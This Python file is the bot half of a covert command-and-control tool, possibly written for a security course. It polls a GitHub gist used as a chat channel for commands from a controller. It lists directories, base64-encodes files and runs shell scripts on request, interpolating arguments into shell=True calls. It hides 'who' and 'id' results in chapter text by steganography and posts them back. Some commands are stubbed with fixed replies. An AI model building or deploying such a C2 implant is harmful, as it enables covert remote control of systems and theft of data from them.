import base64
import uuid
import sys
from time import sleep
from subprocess import check_output
from os import path

sys.path.append('..')
from common.utils import add_message, check_chat_file, get_last_messages, replace_newlines_with_spaces
from common.utils import CONTROLLER_NICK_NAME, BOT_NICK_NAME
from common.gist import pull_gist, init_gist
from common.chapters import get_command_for_chapter, read_chapter
from common.steganography import encode_to_text

SLEEP_TIME = 10


def process_who():
    return 'root'  # check_output('w', shell=True).decode('utf-8').strip()


def process_ls(dir_path):
    if path.exists(dir_path):
        return replace_newlines_with_spaces(check_output(f'ls {dir_path}', shell=True).decode('utf-8').strip())
    return ''


def process_id():
    return 'id: 7777'  # check_output('id', shell=True).decode('utf-8').strip()


def process_cp(file_path):
    if path.exists(file_path):
        file = open(file_path, 'rb')
        data_binary = file.read()
        return base64.b64encode(data_binary).decode('ascii')
    return ''


def process_exec(file_path):
    if path.exists(file_path):
        return replace_newlines_with_spaces(check_output(f'sh {file_path}', shell=True).decode('utf-8').strip())
    return ''


def process_msg(sender, msg_id, msg):
    if len(msg) == 0 or sender != CONTROLLER_NICK_NAME:
        return

    if msg.startswith('Send me text of chapter '):
        chapter_num = int(msg[24]) if msg[25] == ',' else int(msg[24:26])
        cmd = get_command_for_chapter(chapter_num)

        if cmd == 'w':
            result = process_who()
            print(f'>>> who reply: {result}')
        elif cmd == 'id':
            result = process_id()
            print(f'>>> id reply: {result}')
        elif cmd == 'kill':
            return 'kill'
        else:
            print(f'>>> Invalid command: "{cmd}" without path', flush=True)
            return

        chapter = read_chapter(chapter_num)
        encoded, encoded_len = encode_to_text(result, chapter)
        attachment = {
            'name': str(uuid.uuid4()) + '.txt',
            'content': encoded[0:int(encoded_len*1.2)],
        }
        add_message('Text of the chapter is in the attachment', BOT_NICK_NAME, reply_to=msg_id, attachment=attachment)

    elif msg.startswith('ls '):
        result = process_ls(msg[3:])
        print(f'>>> ls reply: {result}')
    elif msg.startswith('cp '):
        result = process_cp(msg[3:])
        print(f'>>> cp reply: {result}')
    elif msg.startswith('exec '):
        result = process_exec(msg[5:])
        print(f'>>> exec reply: {result}')
    else:
        print(f'>>> Unknown command: "{msg}"', flush=True)
        return
    print(flush=True)


def run():
    print('>>> Bot is starting...', flush=True)
    init_gist()
    max_msg_id = check_chat_file()
    # TODO - check previous commands?
    print('>>> Bot is running...', flush=True)

    is_killed = False

    while not is_killed:
        sleep(SLEEP_TIME)
        pull_gist()
        new_max_msg_id = check_chat_file()

        if new_max_msg_id > max_msg_id:
            count = new_max_msg_id - max_msg_id
            print(f'>>> Processing {count} new messages...', flush=True)

            messages = get_last_messages(count)
            for (sender, msg_id, msg) in messages:
                result = process_msg(sender, msg_id, msg)
                if result == 'kill':
                    print('>>> Killing the bot...')
                    is_killed = True
                    break

            max_msg_id = new_max_msg_id
        else:
            print('>>> No new messages...', flush=True)


if __name__ == '__main__':
    run()
